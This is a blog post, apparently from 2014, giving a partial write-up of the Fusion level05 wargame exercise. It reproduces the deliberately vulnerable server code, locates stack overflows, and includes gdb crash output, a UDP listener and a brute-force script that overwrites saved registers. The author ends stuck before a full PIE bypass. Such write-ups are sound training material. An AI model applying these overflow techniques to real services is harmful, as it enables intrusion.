@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Crowd-Solving Fusion level05</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="I played with Fusion level05 for a couple of days last Xmas and although I found how to smash the stack, I couldn&amp;rsquo;t find any reliable way of leaking the .text base address to bypass PIE protection so I left it there. Yesterday, a tweet from @Newlog_ got me thinking it could be a good idea to post what I&amp;rsquo;ve done so far in case anyone wants to pick it from there and help solving the level.">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Crowd-Solving Fusion level05">
+    <meta name="twitter:description" content="I played with Fusion level05 for a couple of days last Xmas and although I found how to smash the stack, I couldn&amp;rsquo;t find any reliable way of leaking the .text base address to bypass PIE protection so I left it there. Yesterday, a tweet from @Newlog_ got me thinking it could be a good idea to post what I&amp;rsquo;ve done so far in case anyone wants to pick it from there and help solving the level.">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Crowd-Solving Fusion level05">
+  <meta property="og:description" content="I played with Fusion level05 for a couple of days last Xmas and although I found how to smash the stack, I couldn&amp;rsquo;t find any reliable way of leaking the .text base address to bypass PIE protection so I left it there. Yesterday, a tweet from @Newlog_ got me thinking it could be a good idea to post what I&amp;rsquo;ve done so far in case anyone wants to pick it from there and help solving the level.">
+  <meta property="og:url" content="http://pwntester.com/blog/2014/04/20/crowd-solving-fusion-level05/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2014/04/20/crowd-solving-fusion-level05/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Crowd-Solving Fusion level05</h1>
+      <p class="post-meta">@pwntester · Apr 20, 2014 · 9 min read</p>
+    </header>
+    <article class="post-content"><p>I played with Fusion level05 for a couple of days last Xmas and although I found how to smash the stack, I couldn&rsquo;t find any reliable way of leaking the .text base address to bypass PIE protection so I left it there. Yesterday, a tweet from <a href="https://twitter.com/Newlog_">@Newlog_</a> got me thinking it could be a good idea to post what I&rsquo;ve done so far in case anyone wants to pick it from there and help solving the level. Lets call this crowd-solving :-D</p>
+
+<p>So lets get the ball rolling:</p>
+
+<p>In <a href="http://exploit-exercises.com/fusion/level05">level05</a> we are given the following server code:</p>
+
+<pre><code class="language-lang-clike">#include &quot;../common/common.c&quot;
+
+#include &lt;task.h&gt;
+
+#define STACK (4096 * 8)
+
+unsigned int hash(unsigned char *str, int length, unsigned int mask)
+{
+  unsigned int h = 0xfee13117;
+  int i;
+
+  for(h = 0xfee13117, i = 0; i &lt; length; i++) {
+    h ^= str[i];
+    h += (h &lt;&lt; 11);
+    h ^= (h &gt;&gt; 7);
+    h -= str[i];
+  }
+  h += (h &lt;&lt; 3);
+  h ^= (h &gt;&gt; 10);
+  h += (h &lt;&lt; 15);
+  h -= (h &gt;&gt; 17);
+
+  return (h &amp; mask);
+}
+
+void fdprintf(int fd, char *fmt, ...)
+{
+  va_list ap;
+  char *msg = NULL;
+
+  va_start(ap, fmt);
+  vasprintf(&amp;msg, fmt, ap);
+  va_end(ap);
+
+  if(msg) {
+    fdwrite(fd, msg, strlen(msg));
+    free(msg);
+  }
+}
+
+struct registrations {
+  short int flags;
+  in_addr_t ipv4;
+} __attribute__((packed));
+
+#define REGDB (128)
+struct registrations registrations[REGDB];
+
+static void addreg(void *arg)
+{
+  char *name, *sflags, *ipv4, *p;
+  int h, flags;
+  char *line = (char *)(arg);
+
+  name = line;
+  p = strchr(line, ' ');
+  if(! p) goto bail;
+  *p++ = 0;
+  sflags = p;
+  p = strchr(p, ' ');
+  if(! p) goto bail;
+  *p++ = 0;
+  ipv4 = p;
+
+  flags = atoi(sflags);
+  if(flags &amp; ~0xe0) goto bail;
+
+  h = hash(name, strlen(name), REGDB-1);
+  registrations[h].flags = flags;
+   registrations[h].ipv4 = inet_addr(ipv4);
+
+  printf(&quot;registration added successfully\n&quot;);
+
+bail:
+  free(line);
+}
+
+static void senddb(void *arg)
+{
+  unsigned char buffer[512], *p;
+  char *host, *l;
+  char *line = (char *)(arg);
+  int port;
+  int fd;
+  int i;
+  int sz;
+
+  p = buffer;
+  sz = sizeof(buffer);
+  host = line;
+  l = strchr(line, ' ');
+  if(! l) goto bail;
+  *l++ = 0;
+  port = atoi(l);
+  if(port == 0) goto bail;
+
+  printf(&quot;sending db\n&quot;);
+
+  if((fd = netdial(UDP, host, port)) &lt; 0) goto bail;
+
+  for(sz = 0, p = buffer, i = 0; i &lt; REGDB; i++) {
+    if(registrations[i].flags | registrations[i].ipv4) {
+      memcpy(p, &amp;registrations[i], sizeof(struct registrations));
+      p += sizeof(struct registrations);
+      sz += sizeof(struct registrations);
+    }
+  }
+bail:
+  fdwrite(fd, buffer, sz);
+  close(fd);
+  free(line);
+}
+
+int get_and_hash(int maxsz, char *string, char separator)
+{
+  char name[32];
+  int i;
+
+  if(maxsz &gt; 32) return 0;
+
+  for(i = 0; i &lt; maxsz, string[i]; i++) {
+    if(string[i] == separator) break;
+    name[i] = string[i];
+  }
+
+  return hash(name, strlen(name), 0x7f);
+}
+
+
+struct isuparg {
+  int fd;
+  char *string;
+};
+
+
+static void checkname(void *arg)
+{
+  struct isuparg *isa = (struct isuparg *)(arg);
+  int h;
+
+  h = get_and_hash(32, isa-&gt;string, '@');
+
+  fdprintf(isa-&gt;fd, &quot;%s is %sindexed already\n&quot;, isa-&gt;string, registrations[h].ipv4 ? &quot;&quot; : &quot;not &quot;);
+
+}
+
+static void isup(void *arg)
+{
+  unsigned char buffer[512], *p;
+  char *host, *l;
+  struct isuparg *isa = (struct isuparg *)(arg);
+  int port;
+  int fd;
+  int i;
+  int sz;
+
+  // skip over first arg, get port
+  l = strchr(isa-&gt;string, ' ');
+  if(! l) return;
+  *l++ = 0;
+
+  port = atoi(l);
+  host = malloc(64);
+
+  for(i = 0; i &lt; 128; i++) {
+    p = (unsigned char *)(&amp; registrations[i]);
+    if(! registrations[i].ipv4) continue;
+
+    sprintf(host, &quot;%d.%d.%d.%d&quot;,
+      (registrations[i].ipv4 &gt;&gt; 0) &amp; 0xff,
+      (registrations[i].ipv4 &gt;&gt; 8) &amp; 0xff,
+      (registrations[i].ipv4 &gt;&gt; 16) &amp; 0xff,
+      (registrations[i].ipv4 &gt;&gt; 24) &amp; 0xff);
+
+    if((fd = netdial(UDP, host, port)) &lt; 0) {
+      continue;
+    }
+
+    buffer[0] = 0xc0;
+    memcpy(buffer + 1, p, sizeof(struct registrations));
+    buffer[5] = buffer[6] = buffer[7] = 0;
+
+    fdwrite(fd, buffer, 8);
+
+    close(fd);
+  }
+
+  free(host);
+}
+
+static void childtask(void *arg)
+{
+  int cfd = (int)(arg);
+  char buffer[512], *n;
+  int r;
+
+
+  n = &quot;** welcome to level05 **\n&quot;;
+
+  if(fdwrite(cfd, n, strlen(n)) &lt; 0) goto bail;
+
+  while(1) {
+    if((r = fdread(cfd, buffer, 512)) &lt;= 0) goto bail;
+
+    n = strchr(buffer, '\r');
+    if(n) *n = 0;
+    n = strchr(buffer, '\n');
+    if(n) *n = 0;
+
+    if(strncmp(buffer, &quot;addreg &quot;, 7) == 0) {
+      taskcreate(addreg, strdup(buffer + 7), STACK);
+      continue;
+    }
+
+    if(strncmp(buffer, &quot;senddb &quot;, 7) == 0) {
+      taskcreate(senddb, strdup(buffer + 7), STACK);
+      continue;
+    }
+
+    if(strncmp(buffer, &quot;checkname &quot;, 10) == 0) {
+      struct isuparg *isa = calloc(sizeof(struct isuparg), 1);
+
+      isa-&gt;fd = cfd;
+      isa-&gt;string = strdup(buffer + 10);
+
+      taskcreate(checkname, isa, STACK);
+      continue;
+    }
+
+    if(strncmp(buffer, &quot;quit&quot;, 4) == 0) {
+      break;
+    }
+
+    if(strncmp(buffer, &quot;isup &quot;, 5) == 0) {
+      struct isuparg *isa = calloc(sizeof(struct isuparg), 1);
+      isa-&gt;fd = cfd;
+      isa-&gt;string = strdup(buffer + 5);
+      taskcreate(isup, isa, STACK);
+    }
+  }
+
+bail:
+  close(cfd);
+}
+
+void taskmain(int argc, char **argv)
+{
+  int fd, cfd;
+  char remote[16];
+  int rport;
+
+  signal(SIGPIPE, SIG_IGN);
+  background_process(NAME, UID, GID);
+
+  if((fd = netannounce(TCP, 0, PORT)) &lt; 0) {
+    fprintf(stderr, &quot;failure on port %d: %s\n&quot;, PORT, strerror(errno));
+    taskexitall(1);
+  }
+
+  fdnoblock(fd);
+
+  while((cfd = netaccept(fd, remote, &amp;rport)) &gt;= 0) {
+    fprintf(stderr, &quot;accepted connection from %s:%d\n&quot;, remote, rport);
+    taskcreate(childtask, (void *)(cfd), STACK);
+  }
+
+
+
+}
+</code></pre>
+
+<p>The server takes different commands as input:</p>
+
+<ul>
+<li>addreg [name] [flags] [ip]: Register an IP with a given flags (32,96 or 224) and store it in an array with an index provided by a custom hash function of the given name</li>
+<li>senddb [ip] [port]: Sends all the registered IPs to the given ip and port using UDP</li>
+<li>isup [skipped] [port]: Loop through all the ips registered and for those with a valid ip, it sends the details to that ip and the provided port</li>
+<li>checkname [name]: Calculate the custom hash of the given name and checks if the registration array contains a valid ip for that hash</li>
+<li>quit: Exit</li>
+</ul>
+
+<p>There are a couple of overflows that we can abuse:</p>
+
+<p>The first one is on <code>get_and_hash</code>  &ldquo;for&rdquo; loop:</p>
+
+<pre><code class="language-lang-clike">for(i = 0; i &lt; maxsz, string[i]; i++) {
+  if(string[i] == separator) break;
+   name[i] = string[i];
+}
+</code></pre>
+
+<p>The loop wont stop at <code>maxsz</code> allowing writing beyond the limits of the &ldquo;name&rdquo; buffer (32). We can quickly verify this using <strong>metasploit</strong> to find the right overflow offet:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ /opt/metasploit-framework/tools/pattern_create.rb 64
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A
+</code></pre>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ nc localhost 20005
+** welcome to level05 **
+checkname Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A
+</code></pre>
+
+<p>Monitoring the process with gdb we get:</p>
+
+<pre><code class="language-lang-bash">(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x35624134 in ?? ()
+</code></pre>
+
+<p>That corresponds to offset 44:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ /opt/metasploit-framework/tools/pattern_offset.rb 35624134
+44
+</code></pre>
+
+<p>This allows us to write beyond &ldquo;name&rdquo; buffer limits and into the stored base pointer and instruction pointer. Actually looks like a nice place to place our payload:</p>
+
+<pre><code class="language-lang-bash">(gdb) x/100wx $esp
+0xb940cc6c:	0x44444444	0x42424242	0x42424242	0x42424242
+0xb940cc7c:	0x42424242	0x42424242	0x42424242	0x42424242
+0xb940cc8c:	0x42424242	0x42424242	0x42424242	0x42424242
+0xb940cc9c:	0x42424242	0x42424242	0x42424242	0x42424242
+0xb940ccac:	0x42424242	0x42424242	0x42424242	0x42424242
+0xb940ccbc:	0x42424242	0x42424242	0x42424242	0x42424242
+0xb940cccc:	0x42424242	0x42424242	0x42424242	0x42424242
+0xb940ccdc:	0x42424242	0x42424242	0x42424242	0x42424242
+0xb940ccec:	0x42424242	0x42424242	0x42424242	0x42424242
+0xb940ccfc:	0x42424242	0x42424242	0x42424242	0x42424242
+0xb940cd0c:	0x42424242	0x42424242	0x42424242	0x42424242
+0xb940cd1c:	0x42424242	0x42424242	0x42424242	0x42424242
+0xb940cd2c:	0x42424242	0x42424242	0x42424242	0x00000000
+</code></pre>
+
+<p>There is another overflow that we cannot exploit since there is a call to <code>free(line)</code> before returning from the function that crash the application. This one is in the <code>senddb</code> function:</p>
+
+<pre><code class="language-lang-bash">unsigned char buffer[512], *p;
+..
+..
+for(sz = 0, p = buffer, i = 0; i &lt; REGDB; i++) {
+  if(registrations[i].flags | registrations[i].ipv4) {
+    memcpy(p, &amp;registrations[i], sizeof(struct registrations));
+    p += sizeof(struct registrations);
+    sz += sizeof(struct registrations);
+  }
+}
+bail:
+  fdwrite(fd, buffer, sz);
+  close(fd);
+  free(line);
+</code></pre>
+
+<p><code>buffer</code> is 512 bytes long but we can overwrite it with 128 (REGDB) registrations which are 6 bytes long each. So with 85 of them we can overwrite the destination buffer.
+The problem is that <code>line</code> will also be affected and the call to <code>free(line)</code> will segfault before getting to <code>ret</code></p>
+
+<p>This was one of the first vectors I tried to use to leak the binary base address since we can overwrite some registers before crashing that could leak the base address plus a fixed offset. However there is no difference in the application behaviour that we can use to know if we overwrote those register bytes with the right values or not (as we did for <a href="http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/">level04</a>)</p>
+
+<p>Anyway if someone wants to give it a try they will first need to set up a listener for the info coming from the <code>senddb</code> fdwrite function. I wrote this listener that works on port 6666/UDP and that works for <code>senddb</code> and <code>isup</code> commands:</p>
+
+<pre><code class="language-lang-python">#!/usr/bin/python
+
+from socket import *
+from struct import *
+
+s = socket(AF_INET, SOCK_DGRAM)
+s.bind(('0.0.0.0', 6666))
+while True:
+    data =  s.recv(1024)
+    print(&quot;[+] Received UDP packet with length {0}: {1}&quot;.format(len(data), data.encode(&quot;hex&quot;)))
+    if data[:1].encode(&quot;hex&quot;) == &quot;c0&quot;:
+        print(&quot;[+] Received ISUP packet {0}&quot;.format(data.encode(&quot;hex&quot;)))
+        print(&quot;[+]   Control char: &quot; + data[:1].encode(&quot;hex&quot;))
+        flags = unpack(&quot;&lt;H&quot;, data[1:3])[0]
+        print(&quot;[+]   Flags: {0}&quot;.format(int(flags),16))
+        # Not printing the ip since we miss a byte and since it will always be our own ip otherwise we could not receive it
+        #reg = unpack(&quot;&lt;I&quot;, data[3:7])[0]
+        #print(&quot;[+]   3 bytes from address: {0}&quot;.format(reg))
+    else:
+        i = 0
+        print(&quot;[+] Received SENDDB packet with {0} registrations&quot;.format(len(data)/6))
+        while i &lt; len(data):
+                reg = data[i:i+6]
+                print(&quot;[+] Received SENDDB packet {0}&quot;.format(reg.encode(&quot;hex&quot;)))
+                flags = unpack(&quot;&lt;H&quot;, reg[0:2])[0]
+                print(&quot;[+]   Flags: {0}&quot;.format(int(flags),16))
+                host = unpack(&quot;&lt;I&quot;, reg[2:6])[0]
+                print(&quot;[+]   Host ({2}) IP: {0} ({1})&quot;.format(inet_ntoa(reg[2:6]),reg[2:6].encode(&quot;hex&quot;),(i+6)/6))
+                i += 6
+</code></pre>
+
+<p>Using this listener and the following bruteforce client script, we can find which names generate the right hashes to overwrite ebp, ebx, eip &hellip;</p>
+
+<pre><code class="language-lang-python">#!/usr/bin/python
+
+from socket import *
+from struct import *
+
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((&quot;localhost&quot;, 20005))
+for i in xrange(139):
+        if i == 84:
+                # EBP
+                payload = &quot;addreg {0} 32 {1}\n&quot;.format(i,inet_ntoa(&quot;\x44\x44\x44\x44&quot;))
+        elif i == 50:
+                # EBX
+                payload = &quot;addreg {0} 32 {1}\n&quot;.format(i,inet_ntoa(&quot;\x41\x41\x41\x41&quot;))
+        else:
+                payload = &quot;addreg {0} 32 127.0.0.{0}\n&quot;.format(i)
+        s.send(payload)
+s.send(&quot;senddb 127.0.0.1 6666\n&quot;)
+s.close()
+</code></pre>
+
+<p>Running the script will get us the following packets in our listener:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ python fusion05-senddb.py
+..
+..
+[+]   Host (86) IP: 127.0.0.70 (7f000046)
+[+]   Host (87) IP: 127.0.0.69 (7f000045)
+[+]   Host (88) IP: 127.0.0.137 (7f000089)
+[+]   Host (89) IP: 65.65.65.65 (41414141)
+[+]   Host (90) IP: 127.0.0.87 (7f000057)
+[+]   Host (91) IP: 68.68.68.68 (44444444)
+</code></pre>
+
+<p>It turns out that we need 139 different &ldquo;names&rdquo; to produce 91 unique hashes that are the ones required to overflow the buffer (not 85 as we calculated)
+The problem is that the 91 registration also overwrites the argument to <code>free(line)</code> as shown in GDB right before calling <code>free()</code></p>
+
+<p>In the first overflow (the <code>get_and_hash()</code> one), we overwrite <code>esi</code> and <code>edi</code> which change on every request before overwriting <code>ebp</code> and <code>eip</code>. Overwriting <code>ebp</code> byte a byte can leak the binary load offset but in order to do so we have to overwrite <code>esi</code> with an address with write permissions (since &ldquo;checkname&rdquo; contains the following instruction after leaving <code>get_and_hash</code>: <code>&lt;checkname+107&gt;: mov (%esi),%eax</code>) and even guessing a good one, overwriting <code>ebp</code> does not change the server behaviour to make educated guesses about the right <code>ebp</code> value. So this looks like a dead end for my newbie skills.</p>
+
+<p>So here I am stucked, any ideas?</p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/post"><span class="tag">Post</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2013</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
